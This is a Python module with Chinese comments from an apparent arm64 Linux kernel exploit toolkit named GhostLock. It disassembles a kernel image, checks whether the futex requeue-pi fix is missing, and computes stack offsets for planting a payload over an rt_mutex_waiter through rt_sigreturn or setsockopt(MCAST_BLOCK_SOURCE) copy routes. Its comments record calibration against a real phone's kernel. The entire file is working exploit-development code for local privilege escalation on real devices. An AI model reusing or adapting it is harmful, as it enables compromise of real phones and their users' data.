#!/usr/bin/env python3
"""containers.py — 自动选「把 payload 盖到 rt_mutex_waiter 上」的容器（多路线）

GhostLock 的三种官方路线（6.6/6.12 的 select_stack、6.1 的 tcp_zerocopy、5.15 的
multicast）都要求内核里存在对应的 syscall 形态；我们这条 sigret 路线要求
rt_sigreturn 里有一次 fpsimd 上下文的 copy_from_user。**换机型时哪种成立是碰运气**，
所以这里把两条都能算的路线都算出来，取可行的那条：

  A. sigret      64 位 rt_sigreturn 的 fpsimd 上下文（GL_PUNCH=sigret，本机验证版）
                 buffer = 0x200/0x210
  B. multicast   64 位 setsockopt(MCAST_BLOCK_SOURCE) → do_ip_setsockopt 里的
                 struct group_source_req 拷贝（GL_PUNCH 不设，app 默认路径）
                 buffer = 0x108（内核按 sizeof 拷贝，与 optlen 无关）

两条路线的几何用同一套公式，只是「写入端」的函数链不同：

    D           = 写入函数自身 frame − 拷贝目标局部偏移
    waiter_depth= Σ frames(futex 链) − waiter 局部偏移
    waiter_off  = D − waiter_depth
    可行        ⟺ waiter_off ≥ 0 且 waiter_off + 尾部字段 ≤ buffer
"""
import glkimg

# 尾部必须落进 buffer 的字段：task + lock（各 8 字节）
TAIL = 0x40
MCAST_BUFFER = 0x108           # 64 位 struct group_source_req
MCAST_BUFFER_COMPAT = 0x104     # 32 位兼容结构
SIGRET_SIZES = (0x200, 0x210)   # fpsimd_context：32×16B（+fpsr/fpcr 为 0x210）


def _waiter_local(img, waiter_size):
    """rt_mutex_waiter 在 futex_wait_requeue_pi 里的栈偏移（W）。

    两种形态都要认：
      · ≤6.1：`memset(&waiter, 0, sizeof)` → add xN, sp, #W + mov w2, #sizeof + bl memset
      · ≥6.6：初始化被展开成若干 `stp xzr, xzr, [sp, #off]`，但
              `rt_mutex_start_proxy_lock(lock, &waiter, task)` 的第 2 参数永远是 &waiter，
              所以 `mov x1, sp` / `add x1, sp, #W` 紧贴在 bl 前面 —— 这是最稳的锚点。
    """
    sizes = [waiter_size] if waiter_size else []
    sizes += [s for s in (0x58, 0x68, 0x70) if s != waiter_size]
    for sz in sizes:
        cands = img.find_local_memset("futex_wait_requeue_pi", sz)
        if cands:
            return cands[0], f"memset({sz:#x})"
    for callee in ("rt_mutex_start_proxy_lock", "rt_mutex_wait_proxy_lock",
                   "rt_mutex_cleanup_proxy_lock"):
        if callee not in img.syms:
            continue
        ins = img.dis("futex_wait_requeue_pi")
        for i, x in enumerate(ins):
            if x.mnemonic != "bl" or img.owner(int(x.op_str[1:], 16)) != callee:
                continue
            for y in reversed(ins[max(0, i - 5):i]):
                if y.mnemonic == "mov" and y.op_str == "x1, sp":
                    return 0, f"{callee} 的 &waiter=sp"
                if y.mnemonic == "add" and y.op_str.startswith("x1, sp, #0x"):
                    return int(y.op_str.split("#")[1], 16), f"{callee} 的 &waiter"
    return None, None


def _futex_side(img, waiter_size):
    """(chain, frames, waiter_local, waiter_size_used)"""
    if "futex_wait_requeue_pi" not in img.syms or "__arm64_sys_futex" not in img.syms:
        return None
    local, how = _waiter_local(img, waiter_size)
    if local is None:
        return None
    chain = img.chain("__arm64_sys_futex", "futex_wait_requeue_pi", max_depth=4)
    if not chain:
        return None
    frames = {n: img.frame(n) for n in chain}
    return {"chain": chain, "frames": frames, "waiter_local": local,
            "waiter_size": waiter_size, "anchor": how,
            "depth": sum(frames.values()) - local}


def _callee_copy_local(img, container, sizes):
    """拷贝发生在**辅助函数**里、目标缓冲在 container 栈上的形态（6.6 就是这样）

    arm64 6.6 把 fpsimd 恢复拆成 read_fpsimd_context()：里面
    `mov w2, #0x200; bl __arch_copy_from_user`，dst 是传进来的指针；
    调用点长这样：`add x0, sp, #0x60; bl read_fpsimd_context`。
    所以 local 从调用点取，size 从辅助函数体内取。
    """
    res = []
    for helper in img.calls(container):
        sites = []
        for hint in sizes:
            sites += img.find_copy_sites(helper, hint, require_sp=False)
        if not sites:
            sites = [s for s in img.find_copy_sites(helper, require_sp=False) if s["size"] >= 0x100]
        if not sites:
            continue
        size = sites[0]["size"]
        ins = img.dis(container)
        for i, x in enumerate(ins):
            if x.mnemonic != "bl" or img.owner(int(x.op_str[1:], 16)) != helper:
                continue
            for y in reversed(ins[max(0, i - 6):i]):
                if y.mnemonic == "mov" and y.op_str == "x0, sp":
                    res.append((0, size, helper))
                    break
                if y.mnemonic == "add" and y.op_str.startswith("x0, sp, #0x"):
                    res.append((int(y.op_str.split("#")[1], 16), size, helper))
                    break
    return res


def _sigret(img, fut):
    """rt_sigreturn 的 fpsimd 拷贝。

    多数内核把 restore_sigframe 内联进 __arm64_sys_rt_sigreturn；但也有的编译成独立函数
    （此时拷贝站点不在 syscall 入口里，而在它调用的那一层），所以两层都找，D 用整条链的
    帧和减局部偏移。
    """
    entry = "__arm64_sys_rt_sigreturn"
    if entry not in img.syms:
        return None
    for container in [entry] + [c for c in img.calls(entry) if c in img.syms]:
        sites = []
        for hint in SIGRET_SIZES:
            sites += img.find_copy_sites(container, hint)
        if not sites:
            sites = [s for s in img.find_copy_sites(container) if s["size"] >= 0x100]
        helper = None
        if not sites:
            cand = _callee_copy_local(img, container, SIGRET_SIZES)
            if not cand:
                cand = _callee_copy_local(img, container, (0,))
            if cand:
                local, size, helper = sorted(cand)[0]
                sites = [{"dst": "x0(callee)", "local": local, "size": size}]
        if not sites:
            continue
        sites.sort(key=lambda s: (s["dst"] != "x0" and not str(s["dst"]).startswith("x0"),
                                  s["size"]))
        s = sites[0]
        chain = [entry] if container == entry else (img.chain(entry, container, 2) or
                                                   [entry, container])
        frames = {n: img.frame(n) for n in chain}
        D = sum(frames.values()) - s["local"]
        off = D - fut["depth"]
        ok = off >= 0 and off + TAIL <= s["size"]
        return {
            "route": "sigret", "punch_env": "sigret",
            "container": " → ".join(chain), "copy_fn": "__arch_copy_from_user",
            "copy_helper": helper,
            "container_frame": sum(frames.values()), "copy_local": s["local"],
            "copy_dst": s["dst"], "buffer": s["size"], "D": D,
            "chain": fut["chain"], "frames": fut["frames"],
            "waiter_local": fut["waiter_local"], "waiter_depth": fut["depth"],
            "waiter_off": off, "feasible": ok,
            "reason": "" if ok else
                      (f"写入起点比 waiter 浅 {-off:#x}" if off < 0 else
                       f"尾部超界 {off + TAIL:#x} > {s['size']:#x}"),
        }
    return None


# 与官方 extract_rs 的 derive::multicast_waiter_off() 保持一致：**不含 sock_setsockopt**。
# 多算这一层会让 waiter_off 偏 0x10（iQOO 12 6.1.145：算出 0x70，官方确认值 0x60；
# 去掉后 0x350−0x18−0x2d8 = 0x60 完全吻合）。6.1.145 里 sock_setsockopt 只是一层
# 薄壳（bl sk_setsockopt），运行时并不在 setsockopt→ip 这条栈上。
MCAST_CHAIN = ["__arm64_sys_setsockopt", "__sys_setsockopt",
               "sock_common_setsockopt", "udp_setsockopt", "ip_setsockopt",
               "do_ip_setsockopt"]


def _multicast(img, fut):
    """setsockopt(MCAST_BLOCK_SOURCE) 路线。

    注意：这条链在中途是**间接调用**（sock->ops->setsockopt / sk_prot->setsockopt），
    反汇编里没有 bl 边，所以不能用 BFS 找链，必须用固定链名（与官方 extract_rs 一致）。
    拷贝长度也不是立即数（copy_from_sockptr 用 optlen），但内核按
    sizeof(struct group_source_req)=0x108 拷贝，局部缓冲靠那条 memset(0x108) 定位。
    """
    if "do_ip_setsockopt" not in img.syms:
        return None
    chain = [n for n in MCAST_CHAIN if n in img.syms]
    if "do_ip_setsockopt" not in chain or len(chain) < 4:
        return None
    locals_ = []
    for buf in (MCAST_BUFFER, MCAST_BUFFER_COMPAT):
        for off in img.find_local_memset("do_ip_setsockopt", buf):
            locals_.append((buf, off))
    if not locals_:
        return None
    buf, local = locals_[0]
    frames = {n: img.frame(n) for n in chain}
    D = sum(frames.values()) - local
    off = D - fut["depth"]
    ok = off >= 0 and off + TAIL <= buf
    return {
        "route": "multicast", "punch_env": None,
        "container": " → ".join(chain), "copy_fn": "do_ip_setsockopt greqs(0x%x)" % buf,
        "container_frame": sum(frames.values()), "copy_local": local,
        "copy_dst": "greqs", "buffer": buf, "D": D,
        "chain": fut["chain"], "frames": fut["frames"],
        "waiter_local": fut["waiter_local"], "waiter_depth": fut["depth"],
        "waiter_off": off, "feasible": ok,
        "reason": "" if ok else
                  (f"写入起点比 waiter 浅 {-off:#x}" if off < 0 else
                   f"尾部超界 {off + TAIL:#x} > {buf:#x}"),
    }


def derive_all(img):
    """返回 {vulnerable, waiter, containers[], best}"""
    patched = img.remove_waiter_patched()
    structs = img.btf()
    waiter_size = task_off = lock_off = None
    if "rt_mutex_waiter" in structs:
        waiter_size, mem = structs["rt_mutex_waiter"]
        task_off, lock_off = mem.get("task"), mem.get("lock")
    fut = _futex_side(img, waiter_size)
    out = {"vulnerable": (not patched) if patched is not None else None,
           "waiter": {"size": waiter_size or (fut or {}).get("waiter_size"),
                      "task": task_off, "lock": lock_off},
           "containers": [], "futex": fut, "btf": bool(structs)}
    if fut is None:
        out["error"] = "futex 侧几何不可得（符号缺 / memset 站点没找到 / 调用链断）"
        return out
    for fn in (_sigret, _multicast):
        c = fn(img, fut)
        if c is None:
            continue
        c["task_offset"] = task_off if task_off is not None else 0x30
        c["lock_offset"] = lock_off if lock_off is not None else 0x38
        # 用真实 task/lock 偏移重算尾部约束
        c["feasible"] = c["waiter_off"] >= 0 and \
            c["waiter_off"] + c["lock_offset"] + 8 <= c["buffer"]
        c["profile"] = {"waiter_off": c["waiter_off"], "buffer_size": c["buffer"],
                        "task_offset": c["task_offset"], "lock_offset": c["lock_offset"]}
        out["containers"].append(c)
    # 优先级：sigret（真机验证过）> multicast
    order = {"sigret": 0, "multicast": 1}
    ok = [c for c in out["containers"] if c["feasible"]]
    ok.sort(key=lambda c: order.get(c["route"], 9))
    out["best"] = ok[0] if ok else None
    return out


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        sys.exit(__doc__)
    img = glkimg.Image(sys.argv[1], sys.argv[2])
    r = derive_all(img)
    print(f"base=0x{img.base:x}  vulnerable={r['vulnerable']}  btf={r['btf']}")
    print(f"waiter={r['waiter']}")
    if r.get("error"):
        sys.exit(r["error"])
    for c in r["containers"]:
        print(f"  [{c['route']:10s}] buffer={c['buffer']:#x} waiter_off={c['waiter_off']:#x} "
              f"depth={c['waiter_depth']:#x} D={c['D']:#x} "
              f"{'✅' if c['feasible'] else '❌ ' + c['reason']}")
    print("best:", r["best"]["route"] if r["best"] else "none")
